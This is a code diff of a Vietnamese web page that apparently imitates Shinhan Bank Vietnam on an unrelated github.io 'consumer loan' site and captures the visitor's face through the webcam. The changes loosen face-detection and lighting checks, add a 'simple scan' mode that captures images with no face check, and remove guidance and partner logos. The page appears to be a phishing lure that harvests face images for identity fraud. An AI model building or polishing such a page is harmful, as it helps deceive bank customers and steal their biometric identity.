@@ -118,10 +118,10 @@
         }
         .face-overlay {
             position: absolute;
-            top: 20%;
-            left: 20%;
-            width: 60%;
-            height: 60%;
+            top: 15%;
+            left: 15%;
+            width: 70%;
+            height: 70%;
             border: 2px dashed #ffffff;
             border-radius: 50%;
             pointer-events: none;
@@ -131,6 +131,29 @@
         .face-detected {
             border-color: #28a745;
             transform: scale(1.05);
+        }
+        .face-overlay::before, .face-overlay::after {
+            content: '\f061';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            color: #ffffff;
+            font-size: 1.2rem;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .face-overlay::before {
+            top: 50%;
+            left: -20px;
+            transform: translateY(-50%) rotate(180deg);
+        }
+        .face-overlay::after {
+            top: 50%;
+            right: -20px;
+            transform: translateY(-50%);
+        }
+        .face-overlay.show-arrows::before, .face-overlay.show-arrows::after {
+            opacity: 1;
         }
         .btn-primary {
             background-color: var(--primary-color);
@@ -180,40 +203,25 @@
             max-width: 100%;
         }
         .partner-logos {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
-        }
-        .partner-logos img {
-            max-height: 40px;
-            object-fit: contain;
-            transition: opacity 0.3s;
-            loading: lazy;
-        }
-        .partner-logos img:hover {
-            opacity: 0.8;
-        }
-        .partner-logos img[onerror] {
-            display: none;
+            display: none; /* Ẩn toàn bộ khối logo */
         }
         .instructions {
             display: flex;
             justify-content: center;
-            gap: 20px;
+            gap: 15px;
             margin-bottom: 15px;
             flex-wrap: wrap;
         }
         .instruction-item {
             display: flex;
             align-items: center;
-            gap: 10px;
-            font-size: 0.9rem;
+            gap: 8px;
+            font-size: 0.85rem;
             color: var(--primary-color);
         }
         .instruction-item i {
             color: var(--accent-color);
+            font-size: 1rem;
         }
         @media (max-width: 768px) {
             .navbar-brand img {
@@ -249,17 +257,14 @@
                 max-width: 100%;
             }
             .face-overlay {
-                top: 15%;
-                left: 15%;
-                width: 70%;
-                height: 70%;
-            }
-            .partner-logos img {
-                max-height: 30px;
+                top: 10%;
+                left: 10%;
+                width: 80%;
+                height: 80%;
             }
             .instructions {
                 flex-direction: column;
-                gap: 10px;
+                gap: 8px;
             }
         }
     </style>
@@ -303,7 +308,7 @@
             <div class="instructions">
                 <div class="instruction-item">
                     <i class="fas fa-camera"></i>
-                    <span>Đặt khuôn mặt vào khung tròn</span>
+                    <span>Đặt khuôn mặt gần khung tròn</span>
                 </div>
                 <div class="instruction-item">
                     <i class="fas fa-lightbulb"></i>
@@ -325,7 +330,7 @@
                     <div id="webcamSection" class="accordion-collapse collapse show" data-bs-parent="#faceAccordion">
                         <div class="accordion-body">
                             <div class="webcam-container">
-                                <video id="webcamVideo" autoplay playsinline muted></video> <!-- Sửa: Thêm muted -->
+                                <video id="webcamVideo" autoplay playsinline muted></video>
                                 <canvas id="webcamCanvas" style="display: none;"></canvas>
                                 <div class="face-overlay" id="faceOverlay"></div>
                             </div>
@@ -335,7 +340,7 @@
                             <div class="text-center mt-2">
                                 <button class="btn btn-primary" onclick="takeSnapshot()">Quét Khuôn Mặt</button>
                                 <button class="btn btn-secondary" onclick="resetWebcam()">Thử Lại</button>
-                                <button class="btn btn-outline-secondary" data-bs-toggle="modal" data-bs-target="#guideModal">Hướng Dẫn</button>
+                                <button class="btn btn-outline-secondary" onclick="takeSnapshot(true)">Quét Đơn Giản</button>
                             </div>
                         </div>
                     </div>
@@ -370,31 +375,6 @@
         </div>
     </main>
 
-    <div class="modal fade" id="guideModal" tabindex="-1" aria-labelledby="guideModalLabel" aria-hidden="true">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h5 class="modal-title" id="guideModalLabel">Hướng Dẫn Quét Khuôn Mặt</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                </div>
-                <div class="modal-body">
-                    <p>Để quét khuôn mặt thành công, vui lòng làm theo các bước sau:</p>
-                    <ul>
-                        <li>Đặt khuôn mặt chính giữa khung tròn trên màn hình.</li>
-                        <li>Đảm bảo ánh sáng đầy đủ, không có bóng tối trên khuôn mặt.</li>
-                        <li>Tháo kính, khẩu trang hoặc bất kỳ vật che mặt nào.</li>
-                        <li>Khi khung tròn chuyển thành màu xanh, nhấn "Quét Khuôn Mặt".</li>
-                    </ul>
-                    <!-- Sửa: Thay placeholder bằng hình thực tế nếu có -->
-                    <img src="https://via.placeholder.com/300x200?text=Hình+Mẫu+Khuôn+Mặt" alt="Hình mẫu khuôn mặt" class="img-fluid">
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <div class="modal fade" id="errorModal" tabindex="-1" aria-labelledby="errorModalLabel" aria-hidden="true">
         <div class="modal-dialog">
             <div class="modal-content">
@@ -419,24 +399,16 @@
                 <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Miễn khoản từ chối liên kết bên ngoài</a> |
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Hướng dẫn truy cập web</a> |
                 <a href="https://shinhan.com.vn/vi/page/sitemap-2.html">Sitemap</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Trung tâm bảo mật</a> |
-                <a href="https://online.shinhan.com.vn/global.shinhan">Demo Ngân hàng trực tuyến</a> |
+                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">VNPay</a> |
+                <a href="https://zalopay.vn">ZaloPay</a> |
                 <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Liên hệ</a> |
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/global-shinhan.html">Trang Global Portal</a> |
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a>
             </div>
             <div class="partner-logos">
+                <!-- Ẩn bằng CSS, giữ HTML để dễ khôi phục nếu cần -->
                 <a href="https://shinhan.com.vn" target="_blank"><img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo"></a>
-                <a href="https://vnpay.vn" target="_blank"><img src="https://pay.vnpay.vn/images/img/logos/bank/big/shinhanbank.svg" alt="VNPay Shinhan Bank Logo"></a>
-                <a href="https://zalopay.vn" target="_blank"><img src="https://pay.vnpay.vn/images/img/logos/bank/big/zalopay.svg" alt="ZaloPay Logo"></a>
-                <img src="https://pay.vnpay.vn/images/img/logos/global-sign.svg" alt="Global Sign Certification">
                 <img src="https://pay.vnpay.vn/images/img/logos/pcidss.svg" alt="PCI DSS Certification">
-                <a href="https://zalo.me" target="_blank"><img src="https://pay.vnpay.vn/images/img/logos/zalo.svg" alt="Zalo Logo"></a>
-                <a href="https://momo.vn" target="_blank"><img src="https://napthengay.vn/media/images/logo/momo_icon_square_pinkbg@3x.png" alt="MoMo Logo"></a>
-                <img src="https://napthengay.vn/media/images/logo/logo-atm@3x.png" alt="ATM Logo">
-                <img src="http://online.gov.vn/Content/EndUser/LogoCCDVSaleNoti/logoCCDV.png" alt="CCDV Certification">
-                <img src="https://napthe.zalopay.vn/static/desktop/images/logos/PCI.svg" alt="ZaloPay PCI Certification">
-                <a href="https://zalopay.vn" target="_blank"><img src="https://gateway.zalopay.vn/pay/v2/images/logo.svg" alt="ZaloPay Gateway Logo"></a>
             </div>
             <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
         </div>
@@ -448,13 +420,12 @@
         let videoElement, canvasElement, stream, tempFaceImage = null, modelsLoaded = false;
 
         async function init() {
-            // Kiểm tra tải mô hình face-api.js với timeout
             const modelLoadPromise = Promise.all([
                 faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights'),
                 faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights')
             ]);
             const timeoutPromise = new Promise((_, reject) => {
-                setTimeout(() => reject(new Error('Tải mô hình quá lâu. Vui lòng kiểm tra mạng.')), 10000);
+                setTimeout(() => reject(new Error('Tải mô hình quá lâu. Vui lòng kiểm tra mạng hoặc dùng Quét Đơn Giản.')), 10000);
             });
 
             try {
@@ -504,7 +475,7 @@
                     audio: false
                 });
                 videoElement.srcObject = stream;
-                webcamStatus.textContent = 'Webcam đã sẵn sàng. Vui lòng căn chỉnh khuôn mặt vào khung.';
+                webcamStatus.textContent = 'Webcam đã sẵn sàng. Vui lòng đưa khuôn mặt gần khung.';
                 if (modelsLoaded) detectFaces();
             } catch (error) {
                 if (error.name === 'OverconstrainedError') {
@@ -536,23 +507,18 @@
                     .withFaceLandmarks();
 
                 if (detections.length > 0) {
-                    const box = detections[0].detection.box;
-                    const centerX = box.x + box.width / 2;
-                    const centerY = box.y + box.height / 2;
-                    const overlayRect = faceOverlay.getBoundingClientRect();
-                    const isCentered = centerX > overlayRect.left && centerX < overlayRect.right &&
-                                      centerY > overlayRect.top && centerY < overlayRect.bottom;
-
                     faceOverlay.classList.add('face-detected');
-                    webcamStatus.textContent = isCentered ? 'Khuôn mặt đã được căn chỉnh!' : 'Vui lòng căn chỉnh khuôn mặt vào khung.';
+                    faceOverlay.classList.remove('show-arrows');
+                    webcamStatus.textContent = 'Khuôn mặt đã sẵn sàng để chụp!';
                 } else {
                     faceOverlay.classList.remove('face-detected');
-                    webcamStatus.textContent = 'Không phát hiện khuôn mặt. Vui lòng đặt khuôn mặt vào khung.';
+                    faceOverlay.classList.add('show-arrows');
+                    webcamStatus.textContent = 'Không phát hiện khuôn mặt. Vui lòng đưa khuôn mặt gần khung.';
                 }
             }, 200);
         }
 
-        function takeSnapshot() {
+        function takeSnapshot(simpleMode = false) {
             const errorElement = document.getElementById('webcamError');
             const successElement = document.getElementById('webcamSuccess');
             const previewElement = document.getElementById('faceImagePreview');
@@ -565,16 +531,33 @@
             canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
             const dataUri = canvasElement.toDataURL('image/jpeg', 0.8);
 
-            if (!checkImageBrightness(dataUri)) {
-                errorElement.textContent = 'Ảnh quá tối. Vui lòng di chuyển đến nơi có ánh sáng tốt hơn hoặc bật đèn.';
-                return;
+            if (!simpleMode && modelsLoaded) {
+                faceapi.detectAllFaces(canvasElement, new faceapi.TinyFaceDetectorOptions()).then(detections => {
+                    if (detections.length === 0) {
+                        errorElement.textContent = 'Không phát hiện khuôn mặt. Vui lòng thử lại hoặc dùng Quét Đơn Giản.';
+                        return;
+                    }
+                    if (!checkImageBrightness(dataUri)) {
+                        errorElement.textContent = 'Ảnh quá tối. Vui lòng di chuyển đến nơi sáng hơn hoặc bật đèn.';
+                        return;
+                    }
+                    previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
+                    document.getElementById('webcamStatus').textContent = 'Đã chụp ảnh khuôn mặt.';
+                    successElement.style.display = 'block';
+                    faceOverlay.style.display = 'none';
+                    tempFaceImage = dataUri;
+                });
+            } else {
+                if (!checkImageBrightness(dataUri)) {
+                    errorElement.textContent = 'Ảnh quá tối. Vui lòng di chuyển đến nơi sáng hơn hoặc bật đèn.';
+                    return;
+                }
+                previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
+                document.getElementById('webcamStatus').textContent = 'Đã chụp ảnh khuôn mặt.';
+                successElement.style.display = 'block';
+                faceOverlay.style.display = 'none';
+                tempFaceImage = dataUri;
             }
-
-            previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
-            document.getElementById('webcamStatus').textContent = 'Đã chụp ảnh khuôn mặt.';
-            successElement.style.display = 'block';
-            faceOverlay.style.display = 'none';
-            tempFaceImage = dataUri;
         }
 
         function checkImageBrightness(dataUri) {
@@ -591,7 +574,7 @@
                 brightness += (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
             }
             brightness /= (imageData.length / 4);
-            return brightness > 60; // Sửa: Tăng ngưỡng để yêu cầu ánh sáng tốt hơn
+            return brightness > 50;
         }
 
         function resetWebcam() {
